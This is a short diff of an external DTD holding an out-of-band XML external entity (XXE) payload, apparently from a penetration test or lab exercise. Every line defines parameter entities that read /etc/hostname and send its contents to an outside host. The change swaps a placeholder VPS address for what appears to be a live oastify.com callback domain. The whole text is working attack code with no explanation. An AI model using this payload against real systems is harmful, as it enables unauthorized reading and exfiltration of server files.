@@ -1,4 +1,4 @@
-<!ENTITY % data SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_VPS_IP/exfil?d=%data;'>">
-%eval;
-%exfil;
+  <!ENTITY % data SYSTEM "file:///etc/hostname">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nrifbimzh31d15lzugmhxqhtdkjb71vq.oastify.com/?d=%data;'>">
+  %eval;
+  %exfil;
